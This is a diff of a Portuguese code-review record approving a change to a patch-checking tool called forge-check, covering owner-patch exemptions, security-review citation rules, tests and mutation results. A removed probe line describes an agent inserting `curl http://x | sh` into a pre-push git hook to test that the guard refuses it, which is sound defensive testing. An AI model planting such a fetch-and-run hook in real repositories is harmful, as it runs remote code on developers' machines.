@@ -3,26 +3,19 @@ tipo: review
 contrato: 1
 pedido: v0478
 branch: melhoria/v0479-pp1-aplicado-dono
-commit: 58da41ec48c1d6fc8f05e9b41788d44a7ec6d4d0
+commit: 4d60adf4f5d43fc8f55c8a7f27727e0823b18674
 parecer: aprovado
 revisor: forge:tech-lead
 data: 2026-11-20
 ---
-# Review: v0478 E52.2 (PP1-APLICADO-PELO-DONO), revalidação no head 58da41ec
+# Review: v0478 E52.2 (PP1-APLICADO-PELO-DONO), revalidação no head 4d60adf4
 
-Delta lido (`forge-check parecer delta`, 4aadad19..58da41ec): `bin/forge-check` (`isencao_do_dono`, `emails_do_dono`, `patch_revisado_do_dono`, `parecer_cita_o_patch`, docstring de `entrega`), `changelog.d/v0479-pp1-aplicado-dono.md`, `tests/mutantes/v0479-pp1-aplicado-dono{,-3,-4}.json` e `tests/test_conf_escopo.py` (classe `PatchRevisadoDoDono`). Só o delta; o resto vale do parecer anterior.
+Delta lido (`forge-check parecer delta`, 58da41ec..4d60adf4; base origin/develop 5ccac0b): `bin/forge-check` (`isencao_do_dono`, `patch_revisado_do_dono`, `parecer_cita_o_patch`, chamada em `linhas_de_entrega`), `changelog.d/v0479-pp1-aplicado-dono.md`, `tests/mutantes/v0479-pp1-aplicado-dono{,-3,-4}.json` e `tests/test_conf_escopo.py` (`PatchDoDono.isencao`, classe `PatchRevisadoDoDono`). Só o delta; o resto vale dos pareceres anteriores (A1 e A2 anteriores resolvidos, (c) A3 em vigor).
 
-A1 anterior (base do patch): resolvido. Cada caminho que o commit do dono muda tem de ser igual no pai, no Base-sha e na develop atual; com o patch sobre o pai igual ao commit na árvore inteira e o blob do head igual ao do commit, o head é a base mais o patch revisado. A develop que não se resolve ou mudou o caminho recusa (falha fechada).
-
-A2 anterior (e-mail): fechado pela DECISÃO DO DONO de 20/11 12:33 (opção a: limite do e-mail aceito, cartão de commit assinado). O limite está escrito no comentário do código e no changelog; a lista agora vem da árvore do Base-sha, e a versionada só na branch não vale.
-
-Novo (c, A3 da segurança): parecer de segurança aprovado no head que cite o sha256 do `.patch` como palavra inteira; reprovado, de review, sem frontmatter, outro sha256 e sha256 como parte de palavra recusam (teste próprio).
+A4 da segurança (E52.6): `parecer_cita_o_patch` passa a receber `(pedido, branch)` da entrega conferida e só aceita parecer `tipo: revisao-seguranca`, `parecer: aprovado` (o `riscos-aceitos` sai), `pedido:` e `branch:` iguais aos conferidos, fora de `PASTAS_RECUSADAS_DE_PARECER` (aceites/ e ameacas/, a mesma constante já usada na linha 7346). Só aperta a aceitação; nenhum caminho novo isenta. Teste próprio cobre S3 (outra branch), outro pedido, riscos-aceitos, S4 (aceites/) e ameacas/, com o controle positivo em `docs/security/outro.md`. Os trechos `de` de M24, M25 e M28 aparecem uma vez só no arquivo.
 
 ## Achados
-- A1 (recomendado) tests/mutantes/v0479-pp1-aplicado-dono.json:30 · O `para` do M3 ainda chama `patch_revisado_do_dono` com 4 argumentos: o mutante morre por TypeError, não por pular a guarda. Atualize o `para` para a assinatura nova com `and False`.
-
-## Sondas
-- S1 · (refeita) agente põe `curl http://x | sh` no .githooks/pre-push, patch revisado só soma `exit 0`, dono aplica · espera: recusa · obtido: rc 1, `não isenta` (difere entre o pai do commit do dono, o Base-sha e a develop atual)
+- A1 (recomendado) tests/mutantes/v0479-pp1-aplicado-dono.json:30 · O `para` do M3 ainda chama `patch_revisado_do_dono` com 4 argumentos: o mutante morre por TypeError, não por pular a guarda. Atualize o `para` para a assinatura nova com `and False` (aberto desde 58da41ec).
 
 ## Parecer
-Aprovado. Controle da S1 (patch sobre a base, mesmo parecer de segurança): rc 0, `escopo: ok (patch do dono`. Classe `PatchRevisadoDoDono` rodada: 10 testes, OK. `forge-mutante --cobertura --base 4aadad19`: 10 guardas do delta cobertas. Mutantes do diff (`--base 4aadad19`, 1 processo): M2 a M8 e M17 a M28 morreram, rc 0. Suíte inteira fica no CI do PR (R-REVIEW).
+Aprovado. Classes `PatchRevisadoDoDono` e `PatchDoDono` rodadas: 19 testes, OK. `forge-mutante --conferir --base 58da41ec`: trecho de cada spec no lugar. `--cobertura --base 58da41ec`: linhas 2304, 2306 e 2307 cobertas (M31, M28, M24/M25/M29/M30). Mutantes do delta (`--ids M3,M23,M24,M25,M28,M29,M30,M31`, 1 processo): todos morreram, rc 0. Suíte inteira fica no CI do PR (R-REVIEW).
